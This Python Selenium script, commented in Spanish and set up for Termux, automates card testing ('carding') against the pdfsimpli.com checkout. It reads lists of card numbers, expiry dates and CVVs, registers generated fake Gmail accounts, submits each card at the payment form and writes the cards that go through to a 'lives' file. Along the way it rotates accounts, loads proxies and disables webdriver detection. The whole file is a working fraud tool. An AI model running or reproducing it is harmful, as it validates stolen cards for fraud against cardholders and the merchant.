# bot_pdf_simpli_completo.py
import os
import time
import random
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.firefox.service import Service

class BotPDFSimpli:
    def __init__(self):
        self.driver = None
        self.wait = None
        
        # Configuración de rutas para Termux
        self.termux_home = "/data/data/com.termux/files/home"
        self.downloads_path = os.path.join(self.termux_home, "storage", "downloads")
        self.geckodriver_path = "/data/data/com.termux/files/usr/bin/geckodriver"
        
        # Archivos de configuración
        self.tarjetas_file = os.path.join(self.downloads_path, "tarjetas.txt")
        self.cuentas_file = os.path.join(self.downloads_path, "cuentas.json")
        self.lives_file = os.path.join(self.downloads_path, "lives.txt")
        self.proxies_file = os.path.join(self.downloads_path, "proxies.txt")
        
        print("🤖 INICIANDO BOT PDF SIMPLI - TERMUX")
        print(f"📁 Carpeta de trabajo: {self.downloads_path}")
        
        # Verificar que la carpeta existe
        if not os.path.exists(self.downloads_path):
            print("❌ ERROR: No tienes acceso al almacenamiento")
            print("💡 Ejecuta: termux-setup-storage")
            return
        
        # Verificar archivos necesarios
        self.verificar_archivos()
        
        # Inicializar listas
        self.cuentas = []
        self.proxies = []
        self.cargar_cuentas()
        self.cargar_proxies()
        
        # Control de proceso
        self.cuenta_actual = None
        self.max_tarjetas_por_cuenta = 3
        
        print("✅ Bot inicializado correctamente")

    def verificar_archivos(self):
        """Verificar y crear archivos necesarios"""
        print("🔍 Verificando archivos...")
        
        # Crear archivo de tarjetas si no existe
        if not os.path.exists(self.tarjetas_file):
            print("📝 Creando archivo de tarjetas...")
            with open(self.tarjetas_file, 'w') as f:
                f.write("# Formato: numero|mes|año|cvv\n")
                f.write("4111111111111111|12|2025|123\n")
        
        # Crear archivo de cuentas si no existe
        if not os.path.exists(self.cuentas_file):
            print("📝 Creando archivo de cuentas...")
            self.generar_cuentas(10)
        
        # Crear archivo lives si no existe
        if not os.path.exists(self.lives_file):
            with open(self.lives_file, 'w') as f:
                f.write("# Tarjetas válidas encontradas\n")

    def generar_cuentas(self, cantidad):
        """Generar cuentas aleatorias"""
        print(f"👥 Generando {cantidad} cuentas...")
        
        nombres = ['juan', 'maria', 'carlos', 'ana', 'luis', 'laura']
        apellidos = ['garcia', 'rodriguez', 'gonzalez', 'lopez', 'martinez']
        
        nuevas_cuentas = []
        for i in range(cantidad):
            nombre = random.choice(nombres)
            apellido = random.choice(apellidos)
            numero = random.randint(1000, 9999)
            
            email = f"{nombre}.{apellido}{numero}@gmail.com"
            password = f"{nombre.capitalize()}{apellido.capitalize()}{random.randint(100, 999)}!"
            
            nuevas_cuentas.append({
                "email": email,
                "password": password,
                "usada": False,
                "tarjetas_procesadas": 0,
                "exitosas": 0,
                "fallidas": 0
            })
        
        self.cuentas = nuevas_cuentas
        self.guardar_cuentas()
        print(f"✅ {cantidad} cuentas generadas")

    def cargar_cuentas(self):
        """Cargar cuentas desde archivo"""
        try:
            if os.path.exists(self.cuentas_file):
                with open(self.cuentas_file, 'r') as f:
                    self.cuentas = json.load(f)
                print(f"✅ {len(self.cuentas)} cuentas cargadas")
            else:
                self.generar_cuentas(5)
        except:
            self.generar_cuentas(5)

    def guardar_cuentas(self):
        """Guardar cuentas en archivo"""
        try:
            with open(self.cuentas_file, 'w') as f:
                json.dump(self.cuentas, f, indent=2)
        except Exception as e:
            print(f"❌ Error guardando cuentas: {e}")

    def cargar_proxies(self):
        """Cargar proxies desde archivo"""
        try:
            if os.path.exists(self.proxies_file):
                with open(self.proxies_file, 'r') as f:
                    for linea in f:
                        linea = linea.strip()
                        if linea and not linea.startswith('#'):
                            self.proxies.append(linea)
                print(f"✅ {len(self.proxies)} proxies cargados")
            else:
                print("⚠️  No se encontró archivo de proxies")
        except Exception as e:
            print(f"❌ Error cargando proxies: {e}")

    def iniciar_navegador(self):
        """Iniciar Firefox en Termux"""
        print("🔄 Iniciando navegador...")
        try:
            # Configurar opciones de Firefox
            options = Options()
            
            # Opciones básicas para Termux
            options.set_preference("browser.privatebrowsing.autostart", True)
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            options.set_preference("accept_insecure_certs", True)
            
            # Configuración de descargas
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.dir", self.downloads_path)
            options.set_preference("browser.download.useDownloadDir", True)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/pdf")
            options.set_preference("pdfjs.disabled", True)
            
            # Para mejor compatibilidad en Termux
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            
            print(f"🔧 Ruta geckodriver: {self.geckodriver_path}")
            
            # Verificar que geckodriver existe
            if not os.path.exists(self.geckodriver_path):
                print("❌ Geckodriver no encontrado")
                print("💡 Ejecuta: pkg install geckodriver")
                return False
            
            # Iniciar el servicio
            service = Service(executable_path=self.geckodriver_path)
            
            # Crear el driver
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.implicitly_wait(10)
            self.wait = WebDriverWait(self.driver, 20)
            
            print("✅ Navegador iniciado correctamente")
            return True
            
        except Exception as e:
            print(f"❌ Error iniciando navegador: {e}")
            return False

    def encontrar_pdf(self):
        """Encontrar archivo PDF en la carpeta"""
        print("🔍 Buscando archivo PDF...")
        try:
            for archivo in os.listdir(self.downloads_path):
                if archivo.lower().endswith('.pdf'):
                    pdf_path = os.path.join(self.downloads_path, archivo)
                    print(f"✅ PDF encontrado: {archivo}")
                    return pdf_path
            print("❌ No se encontró ningún archivo PDF")
            return None
        except Exception as e:
            print(f"❌ Error buscando PDF: {e}")
            return None

    def subir_pdf(self, pdf_path):
        """Subir archivo PDF al sitio"""
        print("📤 Subiendo PDF...")
        try:
            # Ir al sitio web
            self.driver.get("https://pdfsimpli.com")
            time.sleep(3)
            
            # Buscar el input de archivo
            file_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='file']")
            
            if file_inputs:
                file_inputs[0].send_keys(pdf_path)
                print("✅ PDF subido correctamente")
                time.sleep(5)
                return True
            else:
                print("❌ No se encontró el input para subir archivos")
                return False
                
        except Exception as e:
            print(f"❌ Error subiendo PDF: {e}")
            return False

    def hacer_clic_convert(self):
        """Hacer clic en el botón Convert/Continue"""
        print("🔄 Haciendo clic en Convert...")
        try:
            # Buscar botón por varios selectores
            selectores = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//button[contains(text(), 'Convert')]"),
                (By.XPATH, "//button[contains(text(), 'Continue')]"),
                (By.XPATH, "//button[contains(text(), 'Continuar')]"),
            ]
            
            for selector in selectores:
                try:
                    boton = self.wait.until(EC.element_to_be_clickable(selector))
                    boton.click()
                    print("✅ Clic en Convert exitoso")
                    time.sleep(3)
                    return True
                except:
                    continue
            
            print("❌ No se pudo encontrar el botón Convert")
            return False
        except Exception as e:
            print(f"❌ Error haciendo clic en Convert: {e}")
            return False

    def hacer_clic_descarga(self):
        """Hacer clic en el botón de descarga"""
        print("🔄 Haciendo clic en Descargar...")
        try:
            # Buscar botón de descarga
            boton = self.wait.until(EC.element_to_be_clickable((By.ID, "congDwnaut")))
            boton.click()
            print("✅ Clic en Descargar exitoso")
            time.sleep(5)
            return True
        except Exception as e:
            print(f"❌ Error haciendo clic en Descargar: {e}")
            return False

    def registrar_cuenta(self, cuenta):
        """Registrar una cuenta en el sitio"""
        print(f"📝 Registrando cuenta: {cuenta['email']}")
        try:
            # Buscar campos de registro
            email_field = self.wait.until(EC.presence_of_element_located((By.ID, "email")))
            password_field = self.driver.find_element(By.ID, "password")
            
            # Llenar campos
            email_field.clear()
            email_field.send_keys(cuenta['email'])
            
            password_field.clear()
            password_field.send_keys(cuenta['password'])
            
            # Hacer clic en registro
            boton_registro = self.driver.find_element(By.ID, "sign-up")
            boton_registro.click()
            
            print("✅ Registro completado")
            time.sleep(5)
            return True
            
        except Exception as e:
            print(f"❌ Error en registro: {e}")
            return False

    def obtener_proxima_cuenta(self):
        """Obtener la siguiente cuenta disponible"""
        for cuenta in self.cuentas:
            if not cuenta['usada'] or cuenta['tarjetas_procesadas'] < self.max_tarjetas_por_cuenta:
                return cuenta
        
        # Si no hay cuentas disponibles, generar más
        print("⚠️  No hay cuentas disponibles, generando más...")
        self.generar_cuentas(5)
        return self.cuentas[0] if self.cuentas else None

    def marcar_cuenta_usada(self, cuenta, exito=True):
        """Marcar cuenta como usada"""
        cuenta['usada'] = True
        cuenta['tarjetas_procesadas'] += 1
        if exito:
            cuenta['exitosas'] += 1
        else:
            cuenta['fallidas'] += 1
        self.guardar_cuentas()

    def procesar_tarjeta(self, tarjeta, numero_tarjeta):
        """Procesar una tarjeta en la página de pago"""
        print(f"💳 Procesando tarjeta {numero_tarjeta}: {tarjeta['numero']}")
        try:
            # Buscar iframes para los campos de tarjeta
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            
            # Cambiar al iframe del número de tarjeta (generalmente el primero)
            if len(iframes) > 0:
                self.driver.switch_to.frame(iframes[0])
                numero_field = self.driver.find_element(By.ID, "data")
                numero_field.send_keys(tarjeta['numero'])
                self.driver.switch_to.default_content()
            
            # Cambiar al iframe del CVV (generalmente el segundo)
            if len(iframes) > 1:
                self.driver.switch_to.frame(iframes[1])
                cvv_field = self.driver.find_element(By.ID, "data")
                cvv_field.send_keys(tarjeta['cvv'])
                self.driver.switch_to.default_content()
            
            # Completar fecha de expiración
            mes_field = Select(self.driver.find_element(By.NAME, "ccMonthExp"))
            mes_field.select_by_value(tarjeta['mes'])
            
            anio_field = Select(self.driver.find_element(By.NAME, "ccYearExp"))
            anio_field.select_by_value("20" + tarjeta['anio'] if len(tarjeta['anio']) == 2 else tarjeta['anio'])
            
            # Completar nombre
            nombre_field = self.driver.find_element(By.ID, "checkout_form_card_name")
            nombre_field.send_keys("Juan Perez")
            
            # Marcar términos y condiciones
            checkbox = self.driver.find_element(By.ID, "acceptCheckboxMark")
            checkbox.click()
            
            # Hacer clic en el botón de pago
            boton_pago = self.driver.find_element(By.ID, "btnChargeebeeSubmit")
            boton_pago.click()
            
            print("✅ Tarjeta procesada, esperando resultado...")
            time.sleep(10)
            
            # Verificar resultado
            return self.verificar_resultado(tarjeta)
            
        except Exception as e:
            print(f"❌ Error procesando tarjeta: {e}")
            return False

    def verificar_resultado(self, tarjeta):
        """Verificar el resultado del pago"""
        print("🔍 Verificando resultado del pago...")
        try:
            # Verificar por URL de confirmación
            if "confirmation" in self.driver.current_url:
                print("✅ ✅ ✅ PAGO EXITOSO - Tarjeta VÁLIDA")
                self.guardar_tarjeta_valida(tarjeta)
                return True
            
            # Verificar por mensajes de éxito
            mensajes_exito = [
                "Payment successful",
                "payment successful", 
                "Pago exitoso",
                "pago exitoso",
                "Thank you",
                "thank you"
            ]
            
            page_source = self.driver.page_source
            for mensaje in mensajes_exito:
                if mensaje in page_source:
                    print("✅ ✅ ✅ PAGO EXITOSO - Tarjeta VÁLIDA")
                    self.guardar_tarjeta_valida(tarjeta)
                    return True
            
            # Verificar por botón Close (indica error)
            try:
                boton_close = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Close')]")
                if boton_close.is_displayed():
                    print("❌ Pago rechazado - Tarjeta INVÁLIDA")
                    boton_close.click()
                    return False
            except:
                pass
            
            print("❌ No se pudo determinar el resultado - Tarjeta INVÁLIDA")
            return False
            
        except Exception as e:
            print(f"❌ Error verificando resultado: {e}")
            return False

    def guardar_tarjeta_valida(self, tarjeta):
        """Guardar tarjeta válida en archivo"""
        try:
            with open(self.lives_file, 'a') as f:
                f.write(f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}\n")
            print(f"💾 Tarjeta válida guardada: {tarjeta['numero']}")
        except Exception as e:
            print(f"❌ Error guardando tarjeta válida: {e}")

    def leer_tarjetas(self):
        """Leer tarjetas del archivo"""
        print("🔍 Leyendo tarjetas...")
        tarjetas = []
        try:
            with open(self.tarjetas_file, 'r') as f:
                for linea in f:
                    linea = linea.strip()
                    if linea and not linea.startswith('#'):
                        partes = linea.split('|')
                        if len(partes) == 4:
                            tarjetas.append({
                                'numero': partes[0].strip(),
                                'mes': partes[1].strip(),
                                'anio': partes[2].strip(),
                                'cvv': partes[3].strip()
                            })
            print(f"✅ {len(tarjetas)} tarjetas leídas")
            return tarjetas
        except Exception as e:
            print(f"❌ Error leyendo tarjetas: {e}")
            return []

    def eliminar_tarjeta_procesada(self, tarjeta):
        """Eliminar tarjeta procesada del archivo"""
        try:
            with open(self.tarjetas_file, 'r') as f:
                lineas = f.readlines()
            
            with open(self.tarjetas_file, 'w') as f:
                for linea in lineas:
                    if tarjeta['numero'] not in linea:
                        f.write(linea)
            
            print(f"🗑️  Tarjeta eliminada del archivo: {tarjeta['numero']}")
        except Exception as e:
            print(f"❌ Error eliminando tarjeta: {e}")

    def ejecutar_proceso_completo(self):
        """Ejecutar el proceso completo de verificación"""
        print("\n🚀 INICIANDO PROCESO COMPLETO DE VERIFICACIÓN")
        
        # Leer tarjetas
        tarjetas = self.leer_tarjetas()
        if not tarjetas:
            print("❌ No hay tarjetas para procesar")
            return
        
        # Iniciar navegador
        if not self.iniciar_navegador():
            return
        
        # Encontrar PDF
        pdf_path = self.encontrar_pdf()
        if not pdf_path:
            self.driver.quit()
            return
        
        # Obtener primera cuenta
        self.cuenta_actual = self.obtener_proxima_cuenta()
        if not self.cuenta_actual:
            print("❌ No hay cuentas disponibles")
            self.driver.quit()
            return
        
        # Ejecutar flujo para la primera tarjeta
        for i, tarjeta in enumerate(tarjetas):
            print(f"\n--- Procesando Tarjeta {i+1}/{len(tarjetas)} ---")
            
            # Si es la primera tarjeta o después de cambiar cuenta, hacer flujo completo
            if i == 0 or self.cuenta_actual['tarjetas_procesadas'] == 0:
                # Subir PDF
                if not self.subir_pdf(pdf_path):
                    continue
                
                # Convertir
                if not self.hacer_clic_convert():
                    continue
                
                # Descargar
                if not self.hacer_clic_descarga():
                    continue
                
                # Registrar cuenta
                if not self.registrar_cuenta(self.cuenta_actual):
                    continue
            
            # Procesar tarjeta
            resultado = self.procesar_tarjeta(tarjeta, i+1)
            
            # Actualizar cuenta
            self.marcar_cuenta_usada(self.cuenta_actual, resultado)
            
            # Eliminar tarjeta procesada
            self.eliminar_tarjeta_procesada(tarjeta)
            
            # Si la tarjeta fue válida, cambiar de cuenta
            if resultado:
                self.cuenta_actual = self.obtener_proxima_cuenta()
                if not self.cuenta_actual:
                    print("❌ No hay más cuentas disponibles")
                    break
            
            # Esperar entre tarjetas
            if i < len(tarjetas) - 1:
                time.sleep(2)
        
        print("\n🎯 PROCESO COMPLETADO")
        self.driver.quit()

def main():
    """Función principal"""
    bot = BotPDFSimpli()
    
    while True:
        print("\n" + "="*50)
        print("🤖 BOT PDF SIMPLI - MENÚ PRINCIPAL")
        print("="*50)
        print("1. 🚀 Ejecutar proceso completo")
        print("2. 👥 Ver cuentas disponibles")
        print("3. 💳 Ver tarjetas cargadas")
        print("4. 🧪 Probar subida de PDF")
        print("5. 🚪 Salir")
        print("="*50)
        
        opcion = input("Selecciona una opción: ").strip()
        
        if opcion == "1":
            bot.ejecutar_proceso_completo()
        elif opcion == "2":
            print(f"\n👥 Cuentas disponibles: {len(bot.cuentas)}")
            for i, cuenta in enumerate(bot.cuentas[:5]):
                estado = "🆕 Nueva" if not cuenta['usada'] else f"📊 Usada ({cuenta['tarjetas_procesadas']} tarjetas)"
                print(f"   {i+1}. {cuenta['email']} - {estado}")
        elif opcion == "3":
            tarjetas = bot.leer_tarjetas()
            print(f"\n💳 Tarjetas cargadas: {len(tarjetas)}")
            for i, tarjeta in enumerate(tarjetas[:5]):
                print(f"   {i+1}. {tarjeta['numero']} | {tarjeta['mes']}/{tarjeta['anio']} | CVV: {tarjeta['cvv']}")
        elif opcion == "4":
            if bot.iniciar_navegador():
                pdf_path = bot.encontrar_pdf()
                if pdf_path:
                    bot.subir_pdf(pdf_path)
                    input("Presiona ENTER para cerrar el navegador...")
                bot.driver.quit()
        elif opcion == "5":
            print("👋 ¡Hasta pronto!")
            break
        else:
            print("❌ Opción no válida")

if __name__ == "__main__":
    main()